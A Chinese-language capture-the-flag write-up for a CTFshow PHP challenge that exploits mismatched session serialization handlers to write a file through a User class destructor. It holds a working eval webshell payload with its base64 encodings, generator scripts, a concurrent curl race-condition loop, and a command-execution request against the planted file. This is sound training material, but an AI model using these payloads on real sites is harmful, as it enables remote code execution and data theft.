

---

# CTFshow - 一切看起来都那么合情合理 Writeup

  

## 攻击的网址

http://7ad692f4-51fc-4369-8983-eb732efaf502.challenge.ctf.show/

  

## 攻击的过程

  

### 第一步：初步侦察

我首先访问了目标网站，发现这是一个CTFshow的登录页面。页面有用户名和密码输入框，通过AJAX向check.php发送登录请求。

  

### 第二步：寻找突破口

我尝试了各种常见的攻击方法：

- SQL注入：尝试了各种payload，但都返回"登录失败"

- 弱密码：尝试了admin/admin、root/root等常见组合

- 目录扫描：发现了www.zip文件

  

### 第三步：源码分析

下载www.zip后，我发现了关键文件：

1. **index.php** - 设置了`ini_set('session.serialize_handler', 'php')`

2. **check.php** - 处理登录验证

3. **inc/CTFSHOW.php** - 包含User类定义

  

最关键的发现是User类中的`__destruct()`方法：

```php

function __destruct(){

file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));

}

```

  

### 第四步：漏洞利用

我意识到这是一个session反序列化漏洞，利用步骤如下：

  

1. **构造payload**：

- 创建一个User对象，username设为"1.php"

- password设为一句话木马`<?php @eval($_POST['shell']);?>`

- 序列化后得到：`O:4:"User":3:{s:8:"username";s:5:"1.php";s:8:"password";s:31:"<?php @eval($_POST['shell']);?>";s:6:"status";N;}`

- 添加"|"前缀并base64编码

  

2. **条件竞争攻击**：

- 先访问index.php设置session处理器

- 立即访问check.php触发反序列化

- 需要多次并发请求才能成功

  

3. **获取flag**：

- 成功生成log-1.php文件

- 通过POST请求执行`system('cat flag.php')`

- 获得flag：`ctfshow{1dc3443c-35fc-4e6c-ba17-4d6961ed2f1b}`

  

## 攻击的原理

  

### 什么是session反序列化漏洞？

这就像你有一个魔法盒子（session），你可以把东西放进去，但当你取出来时，盒子会自动执行某些操作。

  

在这个题目中：

- index.php设置了一个特殊的"魔法规则"（php序列化处理器）

- check.php使用默认规则

- 当我们用特殊规则放入数据，用默认规则取出时，就会触发意想不到的操作

  

### 为什么能成功？

1. **处理器不一致**：index.php用php处理器，check.php用php_serialize处理器

2. **反序列化触发**：当session被反序列化时，会自动调用User类的`__destruct()`方法

3. **文件写入**：`__destruct()`方法会写入文件，我们可以控制文件名和内容

  

### 比喻解释

想象你有一个自动售货机：

- 你投币（设置session），选择了商品（构造payload）

- 但是因为机器故障（处理器不一致），它不仅给了你商品，还把你选择的"商品名称"写在了旁边的墙上

- 如果你在商品名称里写了"打开后门"（一句话木马），你就获得了后门权限

  

## 攻击的具体步骤

  

### 1. 生成payload

```php

<?php

class User{

public $username;

public $password;

public $status;

function __construct($username,$password){

$this->username = $username;

$this->password = $password;

}

}

  

$user = new User("1.php", "<?php @eval(\$_POST['shell']);?>");

$payload = "|" . serialize($user);

echo base64_encode($payload);

?>

```

  ✅ 成功执行的PHP代码

   1. `<?php phpinfo(-1);?>` - 显示完整PHP配置信息
   2. `<?php echo "PHP Version: " . PHP_VERSION;?>` - 输出PHP版本: 7.3.11
   3. `<?php echo file_get_contents("flag.php");?>` - 成功读取flag.php文件
   4. `<?php highlight_file("check.php");?>` - 显示check.php语法高亮代码

  ❌ 被过滤的PHP代码

   1. `<?php system("uname -a");?>` - 系统命令执行被阻止
   2. `<?php print_r(scandir("."));?>` - 目录扫描被过滤
   3. `<?php var_dump($_SERVER);?>` - 变量调试被阻止

让我详细展示这4个成功执行的PHP代码对应的完整payload：

 ╭───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
 │ ✅ Shell Command cd "/Users/apple/Downloads/www (4)" && php -r "                                                          │
 │    class User{                                                                                                            │
 │        public \$username;                                                                                                 │
 │        public \$password;                                                                                                 │
 │        public \$status;                                                                                                   │
 │        function __construct(\$username,\$password){                                                                       │
 │            \$this->username = \$username;                                                                                 │
 │            \$this->password = \$password;                                                                                 │
 │        }                                                                                                                  │
 │    }                                                                                                                      │
 │                                                                                                                           │
 │    echo '=== 1. phpinfo(-1) 对应的payload ===' . PHP_EOL;                                                                 │
 │    \$user1 = new User('4.php', '<?php phpinfo(-1);?>');                                                                   │
 │    \$serialized1 = serialize(\$user1);                                                                                    │
 │    \$payload1 = '|' . \$serialized1;                                                                                      │
 │    echo '序列化字符串: ' . \$serialized1 . PHP_EOL;                                                                       │
 │    echo '完整payload: ' . \$payload1 . PHP_EOL;                                                                           │
 │    echo 'Base64编码: ' . base64_encode(\$payload1) . PHP_EOL;                                                             │
 │    echo PHP_EOL;                                                                                                          │
 │                                                                                                                           │
 │    echo '=== 2. PHP版本信息 对应的payload ===' . PHP_EOL;                                                                 │
 │    \$user2 = new User('5.php', '<?php echo \"PHP Version: \" . PHP_VERSION;?>');                                          │
 │    \$serialized2 = serialize(\$user2);                                                                                    │
 │    \$payload2 = '|' . \$serialized2;                                                                                      │
 │    echo '序列化字符串: ' . \$serialized2 . PHP_EOL;                                                                       │
 │    echo '完整payload: ' . \$payload2 . PHP_EOL;                                                                           │
 │    echo 'Base64编码: ' . base64_encode(\$payload2) . PHP_EOL;                                                             │
 │    echo PHP_EOL;                                                                                                          │
 │                                                                                                                           │
 │    echo '=== 3. 读取flag.php 对应的payload ===' . PHP_EOL;                                                                │
 │    \$user3 = new User('8.php', '<?php echo file_get_contents(\"flag.php\");?>');                                          │
 │    \$serialized3 = serialize(\$user3);                                                                                    │
 │    \$payload3 = '|' . \$serialized3;                                                                                      │
 │    echo '序列化字符串: ' . \$serialized3 . PHP_EOL;                                                                       │
 │    echo '完整payload: ' . \$payload3 . PHP_EOL;                                                                           │
 │    echo 'Base64编码: ' . base64_encode(\$payload3) . PHP_EOL;                                                             │
 │    echo PHP_EOL;                                                                                                          │
 │                                                                                                                           │
 │    echo '=== 4. highlight_file 对应的payload ===' . PHP_EOL;                                                              │
 │    \$user4 = new User('10.php', '<?php highlight_file(\"check.php\");?>');                                                │
 │    \$serialized4 = serialize(\$user4);                                                                                    │
 │    \$payload4 = '|' . \$serialized4;                                                                                      │
 │    echo '序列化字符串: ' . \$serialized4 . PHP_EOL;                                                                       │
 │    echo '完整payload: ' . \$payload4 . PHP_EOL;                                                                           │
 │    echo 'Base64编码: ' . base64_encode(\$payload4) . PHP_EOL;                                                             │
 │    " (生成4个成功攻击的完整payload)                                                                                       │
 │                                                                                                                           │
 │    === 1. phpinfo(-1) 对应的payload ===                                                                                   │
 │    序列化字符串: O:4:"User":3:{s:8:"username";s:5:"4.php";s:8:"password";s:20:"<?php                                      │
 │    phpinfo(-1);?>";s:6:"status";N;}                                                                                       │
 │    完整payload: |O:4:"User":3:{s:8:"username";s:5:"4.php";s:8:"password";s:20:"<?php                                      │
 │    phpinfo(-1);?>";s:6:"status";N;}                                                                                       │
 │    Base64编码:                                                                                                            │
 │    fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiI0LnBocCI7czo4OiJwYXNzd29yZCI7czoyMDoiPD9waHAgcGhwaW5mbygtMSk            │
 │    7Pz4iO3M6Njoic3RhdHVzIjtOO30=                                                                                          │
 │                                                                                                                           │
 │    === 2. PHP版本信息 对应的payload ===                                                                                   │
 │    序列化字符串: O:4:"User":3:{s:8:"username";s:5:"5.php";s:8:"password";s:43:"<?php echo "PHP Version: " .               │
 │    PHP_VERSION;?>";s:6:"status";N;}                                                                                       │
 │    完整payload: |O:4:"User":3:{s:8:"username";s:5:"5.php";s:8:"password";s:43:"<?php echo "PHP Version: " .               │
 │    PHP_VERSION;?>";s:6:"status";N;}                                                                                       │
 │    Base64编码:                                                                                                            │
 │    fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiI1LnBocCI7czo4OiJwYXNzd29yZCI7czo0MzoiPD9waHAgZWNobyAiUEhQIFZ            │
 │    lcnNpb246ICIgLiBQSFBfVkVSU0lPTjs/PiI7czo2OiJzdGF0dXMiO047fQ==                                                          │
 │                                                                                                                           │
 │    === 3. 读取flag.php 对应的payload ===                                                                                  │
 │    序列化字符串: O:4:"User":3:{s:8:"username";s:5:"8.php";s:8:"password";s:43:"<?php echo                                 │
 │    file_get_contents("flag.php");?>";s:6:"status";N;}                                                                     │
 │    完整payload: |O:4:"User":3:{s:8:"username";s:5:"8.php";s:8:"password";s:43:"<?php echo                                 │
 │    file_get_contents("flag.php");?>";s:6:"status";N;}                                                                     │
 │    Base64编码:                                                                                                            │
 │    fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiI4LnBocCI7czo4OiJwYXNzd29yZCI7czo0MzoiPD9waHAgZWNobyBmaWxlX2d            │
 │    ldF9jb250ZW50cygiZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO047fQ==                                                          │
 │                                                                                                                           │
 │    === 4. highlight_file 对应的payload ===                                                                                │
 │    序列化字符串: O:4:"User":3:{s:8:"username";s:6:"10.php";s:8:"password";s:36:"<?php                                     │
 │    highlight_file("check.php");?>";s:6:"status";N;}                                                                       │
 │    完整payload: |O:4:"User":3:{s:8:"username";s:6:"10.php";s:8:"password";s:36:"<?php                                     │
 │    highlight_file("check.php");?>";s:6:"status";N;}                                                                       │
 │    Base64编码:                                                                                                            │
 │    fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo2OiIxMC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MzY6Ijw/cGhwIGhpZ2hsaWdodF9            │
 │    maWxlKCJjaGVjay5waHAiKTs/PiI7czo2OiJzdGF0dXMiO047fQ==                                                                  │
 │                                                                                                                           │
 ╰───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
✦ 4个成功攻击的完整Payload

  1. <?php phpinfo(-1);?> - 生成log-4.php
  Base64编码:
   1 fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiI0LnBocCI7czo4OiJwYXNzd29yZCI7czoyMDoiPD9waHAgcGhwaW5mbygtMSk7Pz4
     iO3M6Njoic3RhdHVzIjtOO30=

  2. <?php echo "PHP Version: " . PHP_VERSION;?> - 生成log-5.php
  Base64编码:
   1 fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiI1LnBocCI7czo4OiJwYXNzd29yZCI7czo0MzoiPD9waHAgZWNobyAiUEhQIFZlcnN
     pb246ICIgLiBQSFBfVkVSU0lPTjs/PiI7czo2OiJzdGF0dXMiO047fQ==

  3. <?php echo file_get_contents("flag.php");?> - 生成log-8.php
  Base64编码:
   1 fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiI4LnBocCI7czo4OiJwYXNzd29yZCI7czo0MzoiPD9waHAgZWNobyBmaWxlX2dldF9
     jb250ZW50cygiZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO047fQ==

  4. <?php highlight_file("check.php");?> - 生成log-10.php
  Base64编码:
   1 fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo2OiIxMC5waHAiO3M6ODoicGFzc3dvcmQiO3M6MzY6Ijw/cGhwIGhpZ2hsaWdodF9maWx
     lKCJjaGVjay5waHAiKTs/PiI7czo2OiJzdGF0dXMiO047fQ==

  攻击命令模板

  使用这些payload的攻击命令格式：
   1 for i in {1..30}; do
   2     curl "http://target/index.php" -H "Cookie: PHPSESSID=testXXX; limit=[Base64编码的payload]" &
   3     curl "http://target/check.php?u=test&pass=test" -H "Cookie: PHPSESSID=testXXX; limit=[Base64编码的payload]"
     &
   4 done

  然后访问对应的文件：http://target/log-X.php 查看执行结果。

### 2. 执行攻击

```bash

# 多次并发请求

for i in {1..20}; do

curl "http://target/index.php" -H "Cookie: PHPSESSID=test123; limit=[base64_payload]" &

curl "http://target/check.php?u=test&pass=test" -H "Cookie: PHPSESSID=test123; limit=[base64_payload]" &

done

```

  

### 3. 获取flag


```bash

curl -X POST "http://target/log-1.php" -d "shell=system('cat flag.php');"

```

  也可以使用蚁剑链接。



文件命名规则来源详解

  🎯 关键代码位置
  在 inc/CTFSHOW.php 文件的 __destruct() 方法中：

   1 function __destruct(){
   2     file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败").
     "----".date_create()->format('Y-m-d H:i:s'));
   3 }

  📝 文件命名规则

  文件名构成: "log-" + $this->username

  这意味着：
   - 如果 $username = "1.php" → 生成文件 log-1.php
   - 如果 $username = "2.php" → 生成文件 log-2.php
   - 如果 $username = "admin" → 生成文件 log-admin

  🔍 我们攻击过程中的具体操作

 ╭─────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
 │ ✅ Shell Command cd "/Users/apple/Downloads/www (4)" && php -r "                                                │
 │    class User{                                                                                                  │
 │        public \$username;                                                                                       │
 │        public \$password;                                                                                       │
 │        public \$status;                                                                                         │
 │        function __construct(\$username,\$password){                                                             │
 │            \$this->username = \$username;                                                                       │
 │            \$this->password = \$password;                                                                       │
 │        }                                                                                                        │
 │    }                                                                                                            │
 │                                                                                                                 │
 │    // 我们构造的User对象                                                                                        │
 │    echo '=== 攻击1: phpinfo(-1) ===' . PHP_EOL;                                                                 │
 │    \$user1 = new User('4.php', '<?php phpinfo(-1);?>');                                                         │
 │    echo 'username: ' . \$user1->username . PHP_EOL;                                                             │
 │    echo '生成的文件: log-' . \$user1->username . PHP_EOL;                                                       │
 │    echo PHP_EOL;                                                                                                │
 │                                                                                                                 │
 │    echo '=== 攻击2: PHP版本信息 ===' . PHP_EOL;                                                                 │
 │    \$user2 = new User('5.php', '<?php echo \"PHP Version: \" . PHP_VERSION;?>');                                │
 │    echo 'username: ' . \$user2->username . PHP_EOL;                                                             │
 │    echo '生成的文件: log-' . \$user2->username . PHP_EOL;                                                       │
 │    echo PHP_EOL;                                                                                                │
 │                                                                                                                 │
 │    echo '=== 攻击3: 读取flag.php ===' . PHP_EOL;                                                                │
 │    \$user3 = new User('8.php', '<?php echo file_get_contents(\"flag.php\");?>');                                │
 │    echo 'username: ' . \$user3->username . PHP_EOL;                                                             │
 │    echo '生成的文件: log-' . \$user3->username . PHP_EOL;                                                       │
 │    " (演示文件命名规则)                                                                                         │
 │                                                                                                                 │
 │    ... 前 3 行已隐藏 ...（输入ctrl+r查看全部）                                                                  │
 │                                                                                                                 │
 │    === 攻击2: PHP版本信息 ===                                                                                   │
 │    username: 5.php                                                                                              │
 │    生成的文件: log-5.php                                                                                        │
 │                                                                                                                 │
 │    === 攻击3: 读取flag.php ===                                                                                  │
 │    username: 8.php                                                                                              │
 │    生成的文件: log-8.php                                                                                        │
 │                                                                                                                 │
 ╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
✦ 📋 完整的文件命名映射表


  ┌────────────────┬──────────────┬────────────┬───────────────────┐
  │ 攻击目标       │ username设置 │ 生成文件   │ 执行结果          │
  ├────────────────┼──────────────┼────────────┼───────────────────┤
  │ phpinfo()      │ 2.php        │ log-2.php  │ ❌ 被过滤         │
  │ phpinfo(-1)    │ 4.php        │ log-4.php  │ ✅ 成功           │
  │ PHP版本        │ 5.php        │ log-5.php  │ ✅ 成功           │
  │ system命令     │ 6.php        │ log-6.php  │ ❌ 被过滤         │
  │ scandir        │ 7.php        │ log-7.php  │ ❌ 被过滤         │
  │ flag.php       │ 8.php        │ log-8.php  │ ✅ 成功(获得flag) │
  │ var_dump       │ 9.php        │ log-9.php  │ ❌ 被过滤         │
  │ highlight_file │ 10.php       │ log-10.php │ ✅ 成功           │
  └────────────────┴──────────────┴────────────┴───────────────────┘

  🎯 为什么我们知道是log-X.php？

   1. 源码分析: 通过阅读 inc/CTFSHOW.php 中的 __destruct() 方法
   2. 代码逻辑: file_put_contents("log-".$this->username, ...)
   3. 攻击控制: 我们通过设置 $username 来控制文件名
   4. 预测结果: 如果设置 username="4.php"，就知道会生成 log-4.php

  💡 攻击技巧

  这种设计给了攻击者完全的控制权：
   - 文件名可控: 通过 username 参数控制
   - 文件内容可控: 通过 password 参数控制
   - 扩展名可控: 可以设置为 .php 让文件可执行



## 攻击的效果

成功获取flag：`ctfshow{1dc3443c-35fc-4e6c-ba17-4d6961ed2f1b}`

  

## 各种命令的含义

  

### curl命令

- `curl`：像浏览器一样访问网站的工具

- `-X POST`：指定使用POST方法（像提交表单）

- `-H "Cookie: ..."`：设置Cookie（像浏览器的身份标识）

- `-d "shell=..."`：发送POST数据（像填写表单内容）

  

### PHP函数

- `serialize()`：把对象变成字符串（像把玩具拆解成零件清单）

- `base64_encode()`：编码字符串（像把明信片变成密码）

- `file_put_contents()`：写入文件（像在墙上写字）

- `@eval()`：执行PHP代码（像让机器人执行指令）

  

### 系统命令

- `system('cat flag.php')`：读取flag.php文件内容（像打开一个文件查看内容）

  

## 总结

这个题目教会我们：

1. 要仔细检查源代码，特别是session相关的配置

2. 反序列化漏洞可能出现在意想不到的地方

3. 条件竞争是绕过某些限制的有效方法

4. 永远不要相信用户输入，要进行严格的验证

  

通过这次攻击，我成功获取了flag，也学到了很多关于PHP session反序列化漏洞的知识！